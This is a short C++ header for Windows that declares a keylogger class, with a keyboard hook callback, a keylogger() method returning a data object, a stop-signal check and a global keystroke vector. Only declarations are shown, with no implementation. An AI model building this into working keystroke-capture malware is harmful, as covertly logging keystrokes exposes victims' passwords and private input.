#pragma once

#include "KLG_TransferObj.h"
#include <memory>
#include <conio.h>
#include <windows.h>

std::vector<int> keylog;

class KLG_Func
{
public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	DataObj* keylogger();

	bool checkStopSignal();

};